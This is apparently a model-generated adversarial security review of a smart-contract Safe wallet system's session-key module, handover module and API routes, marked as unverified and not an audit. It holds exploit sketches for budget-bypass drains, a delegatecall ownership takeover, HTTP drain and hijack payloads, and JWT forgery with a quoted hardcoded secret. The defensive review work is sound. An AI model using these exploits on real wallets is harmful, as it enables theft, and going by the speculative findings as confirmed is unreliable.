# Adversarial security review (model-generated)

Generated: 2026-10-19T20:34:43
Model: `moonshotai/Kimi-K3` via the Telnyx inference endpoint.
Inputs: contracts/contracts/modules/SessionKeyModule.sol, contracts/contracts/modules/SovereignEvolutionModule.sol, apps/coop-api/src/safe.ts, contracts/scripts/safe-deploy-lib.ts, contracts/test/SessionKeys.ts, contracts/test/SafeOwnershipPasskey.ts, docs/design/custody-and-agent-keys.md, docs/design/group-operated-stack.md, docs/DECISIONS.md

Automated adversarial review, NOT an audit. Every finding is unverified until a PoC
runs. Confidence flags are the model's own; treat `speculative` as a lead to check.
finish_reason=stop; usage={'completion_tokens': 19602, 'prompt_tokens': 29872, 'total_tokens': 49474, 'completion_tokens_details': None, 'prompt_tokens_details': {'audio_tokens': None, 'cache_write_tokens': None, 'cached_tokens': 29824}}

---

# Adversarial Review — Session Keys, Safe Provisioning, and Sovereign Handover

## Scope and method

Read in full:

- `contracts/contracts/modules/SessionKeyModule.sol`
- `contracts/contracts/modules/SovereignEvolutionModule.sol`
- `apps/coop-api/src/safe.ts`
- `contracts/scripts/safe-deploy-lib.ts`
- `contracts/test/SessionKeys.ts`, `contracts/test/SafeOwnershipPasskey.ts`
- `docs/design/custody-and-agent-keys.md`, `docs/design/group-operated-stack.md`, `docs/DECISIONS.md`

Method: model-only review (no compilation, no execution). I traced the full call chain `HTTP route → env key → module → Safe 1.4.1 ModuleManager/OwnerManager` and evaluated each invariant against the code **as written**, plus a forward check against the stated target state (default-closed allow-list + expiry, per `custody-and-agent-keys.md`).

**Citation caveat:** the sources provided contain no line numbers, and I will not invent them. All evidence is cited as `file → function → quoted code`. Where the design doc itself cites approximate lines (e.g. "`listEnabled` defaults false, line ~69"), I quote the code instead and note the doc's citation only as corroboration.

**Not provided:** `apps/coop-api/src/verify-jwt.ts`, `PasskeyOwner.sol`, `StubVerifier.sol`, `MockUsdc.sol`, the Safe 1.4.1 sources themselves. Findings touching these are marked with reduced confidence.

## Invariant scorecard

- **I1 — BROKEN.** The session key can exceed its budget to zero cost (F1) and can take ownership of the Safe via delegatecall (F2).
- **I2 — BROKEN.** Budget check is bypassable in full (F1); allow-list defaults off and ignores `operation` even when armed (F7); no expiry exists (F6). **The intended hardened state (default-closed list + expiry) does NOT fix F1 or the delegatecall hole** — see F1/F7.
- **I3 — BROKEN.** The backend/platform key *is* the owner set of every provisioned Safe at creation (F4); the only handover route is functionally dead (F10).
- **I4 — BROKEN.** A single platform-held session key can unilaterally move *all* of a group Safe's funds and rotate its owners (F1, F2); the platform key unilaterally controls every user Safe until handover (F4).
- **I5 — BROKEN.** The session-execute route relays arbitrary target/data/operation/token with no binding (F3); the sovereign route binds salt→address but not caller→salt (F5); a hardcoded fallback JWT secret sits in source (F8).

## Findings

---

### F1 — Budget accounting trusts caller-declared `amountIn`; any nonzero `token` makes the budget a no-op → total Safe drain at zero cost

- **Breaks:** I2(a) (within budget), I1 (cannot exceed budget), I4 (single key moves group funds)
- **SEVERITY:** Critical
- **CONFIDENCE:** certain

**EVIDENCE** — `SessionKeyModule.sol → executeSpend`:

```solidity
uint256 cost = (token == address(0)) ? value : amountIn;
if (config.spentToday + cost > config.dailyLimit) revert DailyLimitExceeded();
config.spentToday += cost;

bool ok = ISafe(SAFE).execTransactionFromModule(target, value, data, operation);
```

`token` is a pure flag. When `token != 0`, the charged cost is the **caller-declared** `amountIn`, and neither `value` nor the actual calldata amount is bounded. The module never checks that `target == token`, never parses `data`, never caps `value` in the token branch. The NatSpec even states the design assumption: *"The module does NOT parse calldata — the automation declares the amount, so a USDC transfer is bounded exactly like ether."* That assumption is false: declaration is unenforced.

**ATTACK (session key holder — or anyone who reaches the key via the API, see F3):**

1. **Native drain:** `executeSpend(target=attackerEOA, value=<entire Safe ETH balance>, data=0x, operation=0, token=0x0000000000000000000000000000000000000001, amountIn=0)`. `cost = 0`, budget check passes **even with `dailyLimit = 0`**. Safe transfers everything. `spentToday` is unchanged; the attack is repeatable and the `SpendRecorded` event reports a spend of 0 — monitoring sees nothing.
2. **ERC-20 drain:** `executeSpend(target=USDC, value=0, data=transfer(attacker, usdc.balanceOf(SAFE)), operation=0, token=0x1, amountIn=0)`. Full token balance moves; zero budget consumed.
3. Works identically when the allow-list is **armed**: `_allowed` returns `true` for `_data.length < 4` (native case), and for the ERC-20 case the owners would have whitelisted `USDC.transfer` anyway — the selector is honest, only the amount is a lie.

**Note for the target state:** `SessionKeyModuleV2` as described in `custody-and-agent-keys.md` (expiry + default-closed list) **does not close this**. V2 must additionally: bound `value` independently whenever `value > 0`; bind `amountIn` to the calldata (parse `transfer`/`transferFrom` amounts) or to a post-call balance delta; and require `target == token` for token-denominated spends.

**PoC sketch:**

```solidity
function test_BudgetBypass_NativeDrain() public {
    // safe funded with 100 ETH; session enabled with dailyLimit = 1 ether
    vm.prank(sessionKey);
    module.executeSpend(attacker, 100 ether, hex"", 0, address(1), 0);
    assertEq(attacker.balance, 100 ether);
    (,, uint256 spent,) = module.config();
    assertEq(spent, 0); // budget untouched — repeatable
}

function test_BudgetBypass_ERC20Drain_AgainstArmedList() public {
    // listEnabled = true; USDC.transfer whitelisted; safe holds 1_000_000e6 USDC; dailyLimit = 100e6
    bytes memory data = abi.encodeCall(IERC20.transfer, (attacker, 1_000_000e6));
    vm.prank(sessionKey);
    module.executeSpend(address(usdc), 0, data, 0, address(usdc), 1); // declares 1 wei
    assertEq(usdc.balanceOf(attacker), 1_000_000e6);
}
```

---

### F2 — `executeSpend` forwards `operation=1` (delegatecall) → session key takes ownership of the Safe

- **Breaks:** I1 (cannot take ownership / change owner set / add a module), I4, I2(b)
- **SEVERITY:** Critical
- **CONFIDENCE:** certain

**EVIDENCE** — `SessionKeyModule.sol → executeSpend`: `operation` is an attacker-controlled parameter passed straight through:

```solidity
function executeSpend(
    address target,
    uint256 value,
    bytes calldata data,
    uint8 operation,   // <-- no validation
    ...
) external returns (bool) {
    ...
    bool ok = ISafe(SAFE).execTransactionFromModule(target, value, data, operation);
```

Safe 1.4.1's `ModuleManager.execTransactionFromModule` honors `Enum.Operation.DelegateCall`. Nothing in the module restricts it, and `_allowed(target, data)` never inspects `operation`.

**ATTACK:**

1. Session key deploys:
```solidity
contract Evil {
    function pwn(address attacker) external {
        // delegatecall context: address(this) == the Safe; the external call's
        // msg.sender == the Safe, satisfying OwnerManager's `authorized`
        ISafeFull(address(this)).addOwnerWithThreshold(attacker, 1);
    }
}
```
2. `executeSpend(target=Evil, value=0, data=abi.encodeCall(Evil.pwn,(attacker)), operation=1, token=address(1), amountIn=0)`.
3. `Evil.pwn` executes in the Safe's context. The subsequent call to `addOwnerWithThreshold` has `msg.sender == address(this) == Safe`, passing `SelfAuthorized`. Attacker is now an owner with threshold 1 and executes anything. (Equally: direct storage writes to the owner-mapping/threshold slots, or `enableModule(attackerModule)`.)
4. With `listEnabled = false` (the default — F7), step 2 passes `_allowed` trivially.

**This survives the intended hardening.** Even with a default-closed, fully armed allow-list, whitelisting a target+selector implicitly authorizes a **delegatecall** of that selector into the Safe's storage context, because the list is keyed on `(target, selector)` only. Any whitelisted contract whose code writes storage (any ERC-20, any router) becomes a storage-corruption primitive against the Safe. V2 must pin `operation == 0` or allow-list delegatecall explicitly and separately.

**PoC sketch:**

```solidity
function test_Delegatecall_OwnershipTakeover() public {
    Evil evil = new Evil();
    vm.prank(sessionKey);
    module.executeSpend(address(evil), 0, abi.encodeCall(Evil.pwn, (attacker)), 1, address(1), 0);
    assertTrue(safe.isOwner(attacker));
    assertEq(safe.getThreshold(), 1);
    // attacker now execTransaction's the whole balance out, no module involved
}
```

---

### F3 — `/api/safe/session/execute` relays arbitrary target/data/operation/token signed by the platform's session key → any JWT holder drains or takes over the group Safe remotely

- **Breaks:** I5 (no on-chain effect beyond invariants), I1, I2
- **SEVERITY:** Critical
- **CONFIDENCE:** certain (given F1/F2; the route code is quoted below)

**EVIDENCE** — `apps/coop-api/src/safe.ts → /api/safe/session/execute`:

```ts
const target = body?.target;
const token: string = body?.token ?? ethers.ZeroAddress;
const amountIn: bigint = ethers.parseUnits(String(body?.amountIn ?? "0"), 6);
...
const data: string = body?.data ?? "0x";
const operation: number = body?.operation ?? 0;
const value: bigint = ethers.parseEther(String(body?.value ?? "0"));
...
const tx = await module.executeSpend(target, value, data, operation, token, amountIn);
```

Every attacker-relevant field is taken from the request body with **zero validation**: no target allow-list server-side, no `operation` restriction, no `token`/`data` consistency check, no per-identity scoping of `claims` (the JWT claims are verified and then never used). The route signs with the env-held `SESSION_KEY`, so the caller never needs the key itself.

**ATTACK:** `POST /api/safe/session/execute` with any valid JWT (see F8 for forging one):

```json
{ "target": "<attacker>", "value": "<safe ETH balance>", "token": "0x0000000000000000000000000000000000000001", "amountIn": "0", "operation": 0, "data": "0x" }
```
→ F1 drain. Or `"operation": 1, "target": "<deployed Evil>", "data": "<pwn calldata>"` → F2 ownership takeover, executed over HTTP. The route's own comment claims *"budget + allow-list enforced on-chain … this route only relays"* — true, and precisely the problem: the on-chain enforcement is bypassable, so the relay is an unauthenticated-beyond-JWT drain/takeover primitive.

**PoC sketch:**

```ts
it("remote drain via session/execute", async () => {
  const jwt = await mintAnyValidJwt();
  const res = await app.inject({ method: "POST", url: "/api/safe/session/execute",
    headers: { authorization: `Bearer ${jwt}` },
    payload: { target: attacker, value: "100", token: "0x0000000000000000000000000000000000000001", amountIn: "0", operation: 0, data: "0x" } });
  expect(res.statusCode).to.equal(200);
  expect(await provider.getBalance(safeAddr)).to.equal(0n);
});
```

---

### F4 — The platform/backend key is the sole owner of every provisioned Safe at creation; I3 is broken by construction

- **Breaks:** I3 (no platform key in the owner set), I4 (platform can unilaterally move funds / rotate owners during the window)
- **SEVERITY:** Critical (systemic; single key in plaintext env controls all un-handed-over Safes)
- **CONFIDENCE:** certain

**EVIDENCE** — `apps/coop-api/src/safe.ts`:

```ts
backendKey: process.env.SAFE_BACKEND_SIGNER_KEY ?? "",
...
// The default Safe config: owned 1-of-1 by the backend signer.
const defaultInitializer = (): string =>
  encodeSafeSetup([new ethers.Wallet(env.backendKey).address], 1);
...
const result = await deploySafe(signer, {...}, [signer.address], 1);
```

Every Safe deployed via `/api/safe/deploy` (and `/api/onboard`) is owned 1-of-1 by `SAFE_BACKEND_SIGNER_KEY` until a separate `/api/safe/sovereign` call completes. During that window the platform is not "only paying gas" — it *is* the wallet: it can move all funds and rotate owners unilaterally, and compromise of the plaintext env key is total loss across **all** such Safes. The design doc itself records this as defect 3 ("*Between creation and that call, the platform is the wallet*") and defect 4 (keys in plain env). Compounding: the handover route is functionally dead (F10), so in practice the window may never close.

**ATTACK:** steal/leak `SAFE_BACKEND_SIGNER_KEY` (plaintext env, long-lived) → `execTransaction` on every predicted backend-owned Safe → drain all. No module, no budget, no expiry involved.

**PoC sketch:**

```ts
it("backend key unilaterally drains a user safe pre-handover", async () => {
  // deploy via API, fund the safe, then:
  await execSafeTx(safe, [backendWallet], { to: attacker, value: balance });
  expect(await provider.getBalance(safeAddr)).to.equal(0n);
});
```

---

### F5 — `/api/safe/sovereign` binds salt→address but never caller→salt: any JWT holder who learns or guesses a saltNonce can install their own owner (theft) or an uncontrolled address (permanent lock)

- **Breaks:** I5 (target-binding / auth), I4
- **SEVERITY:** High
- **CONFIDENCE:** likely — the absence of binding is certain from the code; exploitability depends on salt entropy/secrecy, which the system does not enforce

**EVIDENCE** — `apps/coop-api/src/safe.ts → /api/safe/sovereign`: the only capability checks are (a) a valid JWT whose claims are then ignored, and (b) possession of `saltNonce`:

```ts
const claims = verifyBearer(request, reply);   // claims never used again
...
const predicted = predictSafeAddress({ factory, singleton, initializer: defaultInitializer(), saltNonce: salt });
if (predicted.toLowerCase() !== safeAddress.toLowerCase()) { ... reject ... }
...
const owners: string[] = await safe.getOwners();
if (owners.length !== 1 || owners[0].toLowerCase() !== backendAddr.toLowerCase()) { ... reject ... }
// then: swapOwner(SENTINEL, backend, passkeyOwner) — passkeyOwner is caller-supplied
```

`passkeyOwner` is validated only by `ethers.isAddress` — not that it has code, not that it is an EIP-1271 contract, not that the caller controls it. `parseSaltNonce` accepts any `1..2^256-1`; there is no minimum entropy and no registration step binding a salt to an identity.

**ATTACK:**

1. Attacker (any JWT) enumerates low-entropy salts (`"1"`, `"2"`, …) or obtains a victim's salt (it travels in request bodies; any body-logging proxy, error trace, or client-side leak exposes it — the code's only protection is a comment asserting pino logs method/url/status).
2. For each: `predictSafeAddress(salt)` → `getCode` → `getOwners == [backend]` → victim found, not yet handed over.
3. `POST /api/safe/sovereign { safeAddress, saltNonce, passkeyOwner: <attacker EOA> }`. The backend signs the `swapOwner` itself. Attacker now owns the victim's Safe and everything in it — or submits `passkeyOwner = 0xdead…` (no code, no key) to brick it permanently.

The salt is a **bearer capability in a POST body**, and the route converts it into an ownership change signed by the platform. That is the exact "target-binding" failure I5 names.

**PoC sketch:**

```ts
it("handover hijack with a foreign salt", async () => {
  // victim deployed safe with saltNonce "42", still backend-owned
  const res = await app.inject({ method: "POST", url: "/api/safe/sovereign",
    headers: { authorization: `Bearer ${attackerJwt}` },
    payload: { safeAddress: victimSafe, saltNonce: "42", passkeyOwner: attacker.address } });
  expect(res.statusCode).to.equal(200);
  expect(await safe.getOwners()).to.deep.equal([attacker.address]);
});
```

---

### F6 — No session expiry: a leaked session key is valid until governance acts

- **Breaks:** I2(c) (unexpired session), I1
- **SEVERITY:** High (amplified to Critical by F1/F2: the leaked key is not bounded in practice)
- **CONFIDENCE:** certain

**EVIDENCE** — `SessionKeyModule.sol → SessionConfig / enableSessionKey`:

```solidity
struct SessionConfig {
    address sessionKey;
    uint256 dailyLimit;
    uint256 spentToday;
    uint256 lastResetDay;
}
```

No `validUntil`, no expiry check anywhere in `executeSpend`. The only off-switches are owner transactions (`disableModule` / re-`enableSessionKey`). The design doc names this defect 1. Per the review brief, the target state includes expiry — recorded here as a confirmed current-state break, not a new discovery. Note the interaction: expiry shrinks the *window* of F1/F2 but not their *magnitude* (one tx drains everything), so expiry is necessary and nowhere near sufficient.

**PoC sketch:**

```solidity
function test_SessionKeyNeverExpires() public {
    vm.warp(block.timestamp + 365 days);
    vm.prank(sessionKey);
    module.executeSpend(attacker, 1 ether, hex"", 0, address(0), 0); // still works
}
```

---

### F7 — Allow-list defaults off; and even armed, `_allowed` ignores `operation` and waves through <4-byte calldata

- **Breaks:** I2(b) (target/selector allowed)
- **SEVERITY:** High in current state (any target, any selector, budget-only — and the budget is F1-bypassable); Medium as a design residual for the armed state
- **CONFIDENCE:** certain

**EVIDENCE** — `SessionKeyModule.sol`:

```solidity
bool public listEnabled;   // defaults false
...
function _allowed(address _target, bytes calldata _data) internal view returns (bool) {
    if (!listEnabled) return true;
    if (whitelistedTargets[_target]) return true;
    if (_data.length < 4) return true;   // any short calldata passes, any target
    bytes4 sel = bytes4(_data);
    return whitelistedSelectors[_target][sel];
}
```

Current state: `listEnabled == false` ⇒ the session key reaches **any target with any calldata** — confirmed by the test *"is default-permissive until the Safe arms the allow-list"*. Armed state residuals: (1) `operation` is never checked (F2's delegatecall works against whitelisted targets); (2) 1–3-byte calldata passes to any target, hitting arbitrary fallback functions; (3) plain native transfers always pass — safe only if the budget actually bounds native value, which F1 defeats. For the target state: default-closed is necessary; V2 must also pin operation and decide whether fallback-reaching short calldata is acceptable.

**PoC sketch:**

```solidity
function test_ArmedList_StillPermitsDelegatecallToWhitelistedTarget() public {
    // owners whitelist (target, selector) for a normal call
    vm.prank(sessionKey);
    module.executeSpend(target, 0, abi.encodeWithSelector(whitelistedSel), 1 /* delegatecall */, address(1), 0);
    // succeeds: selector matches; operation unchecked
}
```

---

### F8 — Hardcoded fallback JWT secret in source

- **Breaks:** I5 (auth)
- **SEVERITY:** High if live; otherwise Low
- **CONFIDENCE:** speculative — `verify-jwt.ts` was not provided, so I cannot confirm it consumes this `env.jwtSecret`; the fallback's presence in `safe.ts` is certain

**EVIDENCE** — `apps/coop-api/src/safe.ts`:

```ts
jwtSecret: process.env.JWT_SECRET ?? "local-development-secret-irl-coop-v4",
```

A public, in-repo default signing secret. If `verifyBearer` (or sibling routes) share this pattern and any deployment omits `JWT_SECRET`, anyone can mint a valid JWT and reach F3/F5 unauthenticated. Fail-fast (throw when unset outside explicit dev mode) is the fix. Flagged honestly as unverified against the actual verifier.

**PoC sketch:** `jwt.sign({ sub: "attacker" }, "local-development-secret-irl-coop-v4")` → call `/api/safe/session/execute` → observe 200.

---

### F9 — `SovereignEvolutionModule`: empty `onlySafe`, no on-chain effect, and its "irreversible" revocation is reversible in its own ledger

- **Breaks:** I1/I3 at the trust layer (any consumer believing it believes a backend signer was revoked when nothing on-chain changed)
- **SEVERITY:** Medium (no direct fund movement in the reviewed code; impact depends on consumers not shown)
- **CONFIDENCE:** certain (code behavior); speculative (downstream impact)

**EVIDENCE** — `SovereignEvolutionModule.sol`:

```solidity
modifier onlySafe() {
    // In a real module, we verify msg.sender is the Safe proxy
    _;
}
```

The guard is a comment. The module only mutates its own `safeConfigs` mapping — it cannot and does not touch any Safe's owner set, yet emits `BackendSignerRevoked` and `StageUpgraded`. Worse, the claimed irreversibility is false even internally:

```solidity
function initializeSafe(address _backendSigner) external {
    require(safeConfigs[msg.sender].backendSigner == address(0), "Already initialized");
```

`promoteToSovereign` sets `backendSigner = address(0)` — which is exactly the precondition for `initializeSafe` to succeed again. Sequence: `initializeSafe(A)` → `promoteToSovereign(g)` → `initializeSafe(B)` ✅ → stage flips back to `Stage1_Convenience` with a *new* backend signer `B`. Any indexer, dashboard, or backend that treats `getSafeConfig(s).currentStage == Stage2` or the `BackendSignerRevoked` event as "the platform key no longer controls this Safe" can be lied to by anyone calling these functions from a contract they control. The design doc already flags the stub (defect 2); the re-initialization hole is additive. Delete it, as the doc proposes.

**PoC sketch:**

```solidity
function test_Stub_ReinitializeAfterPromote() public {
    vm.prank(alice);
    stub.initializeSafe(backendA);
    vm.prank(alice);
    stub.promoteToSovereign(guardians);
    vm.prank(alice);
    stub.initializeSafe(backendB); // succeeds — "irreversible" revoked
    (Stage s, address bs,) = stub.getSafeConfig(alice);
    assertEq(uint(s), uint(Stage.Stage1_Convenience));
    assertEq(bs, backendB);
}
```

---

### F10 — The sovereign handover route is functionally dead: it calls `nonce()` / `getTransactionHash()` on an interface that doesn't declare them

- **Breaks:** I3 operationally (the only path out of platform ownership cannot execute)
- **SEVERITY:** Medium (liveness; security consequence is that Safes remain backend-owned — compounding F4)
- **CONFIDENCE:** likely (standard ethers v6 behavior; not executed)

**EVIDENCE** — `apps/coop-api/src/safe.ts`:

```ts
const SAFE_IFACE = new ethers.Interface([
  "function execTransaction(address to, uint256 value, bytes data, uint8 operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, bytes signatures)",
]);
...
const safeContract = new ethers.Contract(safeAddress, SAFE_IFACE, backendSigner);
const nonce: bigint = await safeContract.nonce();                    // not in SAFE_IFACE
...
const safeTxHash = await safeContract.getTransactionHash(...);       // not in SAFE_IFACE
```

In ethers v6, contract methods are built from the interface fragments; `nonce` and `getTransactionHash` are absent, so these calls throw before any transaction is sent, and the route returns 500 on every invocation. Either this route has never been run against a live Safe, or handover happens through some path not in the reviewed sources. Both readings are bad: a dead migration path, or an unreviewed one.

**PoC sketch:** API-level test: deploy a backend-owned Safe, POST `/api/safe/sovereign` with valid params, assert 200 — it will fail at `safeContract.nonce is not a function`.

---

### F11 — Unauthenticated-quota-free deploy route: gas griefing of the backend signer

- **Breaks:** I5 (availability side-effect)
- **SEVERITY:** Low
- **CONFIDENCE:** likely

**EVIDENCE** — `apps/coop-api/src/safe.ts → deploy`: any valid JWT triggers `signer.sendTransaction(...)` to the factory, paid by `SAFE_BACKEND_SIGNER_KEY`; no rate limit, no per-identity quota (`claims` unused), no cap on distinct `saltNonce` values. Each call costs the platform real gas on Base. Combined with F8, potentially unauthenticated.

**PoC sketch:** loop `POST /api/safe/deploy` with incrementing `saltNonce`; assert backend EOA balance decreases monotonically.

---

### F12 — `getRemainingLimit` underflows after `updateDailyLimit` is set below `spentToday`

- **Breaks:** none directly (view correctness)
- **SEVERITY:** Informational
- **CONFIDENCE:** certain

**EVIDENCE** — `SessionKeyModule.sol`:

```solidity
function updateDailyLimit(uint256 _dailyLimit) external onlySafe {
    config.dailyLimit = _dailyLimit;   // spentToday not adjusted
}
...
return config.dailyLimit - spent;      // reverts when spent > dailyLimit
```

Owner lowers the limit below today's spend → the view reverts (0.8 checked arithmetic) until the next day-roll. `executeSpend` itself remains safe (its check is `spent + cost > limit`). Minor UI/keeper DoS only.

---

### Areas checked with NO break found (stated plainly, per instructions)

- **Reentrancy in `executeSpend`:** no break. `spentToday` is incremented before the external call (CEI), and any reentrant caller fails `msg.sender != config.sessionKey` (the reentering target/Safe is not the session key).
- **Day-roll manipulation:** no practical vector. `block.timestamp / 1 days` on a PoS chain (Base) is not validator-manipulable at the granularity needed; boundary straddling is by design.
- **`swapOwner` SENTINEL/prevOwner usage:** correct in both the route and tests for a sole-owner list (backend is list head ⇒ `prevOwner = SENTINEL_OWNERS`). The route also refuses multi-owner Safes (`owners.length !== 1`), so no wrong-`prevOwner` path is reachable.
- **Owner-governance gating on the module:** `enableSessionKey`, `updateDailyLimit`, `setListEnabled`, `authorize` are all correctly `onlySafe` (`msg.sender != SAFE` reverts), and the test *"rejects binding the session key unless called BY the Safe"* confirms the bot cannot self-grant.
- **Module disable:** correctly severs authority (`GS104`), test-confirmed.
- **Replay of the sovereign handover:** after a successful handover the `owners == [backend]` precondition fails, so the signed swap is not replayable. (The pre-handover hijack is F5, not replay.)
- **Signed invites/tokens:** not present in the provided sources — not examined.

## What this review did NOT examine

- `apps/coop-api/src/verify-jwt.ts` — the actual JWT verification (algorithm confusion, audience/expiry checks, whether it reads the F8 default). F8's confidence is capped by this.
- `PasskeyOwner.sol` / `StubVerifier.sol` — the EIP-1271/P-256 verification the whole target architecture rests on. The test file shows a **stub** verifier stands in for real P-256; nothing about the production verifier (EIP-7212 precompile vs. Solidity fallback) is reviewed.
- Safe 1.4.1 sources themselves — ModuleManager/OwnerManager behavior is asserted from the pinned version's known semantics (GS104, `authorized`, delegatecall in `execute`), not re-derived from in-tree code.
- `MockUsdc.sol`, deployment scripts, `networks.json`, and whether `SAFE_PROXY_CREATION_CODE` actually matches the deployed factory's bytecode (a mismatch silently bricks prediction and the sovereign route's salt check — the code comments flag this; I did not verify it).
- Off-chain infrastructure: pino redaction config (does anything log request bodies carrying `saltNonce`?), env management, Keycloak issuance, rate limiting at the edge.
- The payments/treasury code (`payments.ts`, `CoopUsdcRouter`) referenced in the docs.
- Economic/governance attacks on the N-of-M group Safe itself (threshold selection, owner collusion) — out of scope of the provided contracts.

## PoCs worth actually writing

Ranked by value-per-effort; the first three are one test each and settle the review's core claims:

1. **F1 budget bypass** — `test_Bypass_NativeDrain` + `test_Bypass_ERC20Drain_AgainstArmedList`. Proves a zero-budget session key drains everything and that `SpendRecorded` reports 0. This is the finding that survives the planned V2 hardening; write it first.
2. **F2 delegatecall takeover** — `test_Delegatecall_AddsOwner` with a 5-line `Evil` contract calling `addOwnerWithThreshold`. Proves I1 is broken on-chain, not just over-HTTP.
3. **F3 API relay** — integration test: one `POST /api/safe/session/execute` with `token=0x…01, amountIn=0` (and a second with `operation=1`) drains/takes over with any JWT. This is the bug-bounty-reproducible remote path.
4. **F5 handover hijack** — API test: victim's salt + attacker's JWT + attacker's `passkeyOwner` ⇒ attacker owns the victim's Safe. Settles the missing caller↔salt binding.
5. **F7 armed-list residuals** — `test_ArmedList_DelegatecallToWhitelistedTarget` and a 3-byte-calldata fallback call. Forces the V2 design to pin `operation`.
6. **F9 stub re-initialization** — `test_Promote_Then_InitializeSafe_Succeeds`. One transaction sequence; nails the "irreversible" claim before anything integrates with this module.
7. **F10 dead route** — one API test asserting the sovereign route returns 200; it will fail at `safeContract.nonce()`. Cheap, and it forces the question of how handover is actually performed in production.

**Bottom line for the bounty pass:** I1–I5 are all broken in the current tree, and two of the breaks (F1's declared-amount accounting, F2/F7's unchecked `operation`) are **not** closed by the documented target state of "default-closed allow-list + expiry." `SessionKeyModuleV2` must additionally bind `value`/`amountIn` to reality and pin or separately allow-list delegatecall, or the hardened module remains a full-drain and ownership-takeover primitive behind a daily budget that reports zero spend.
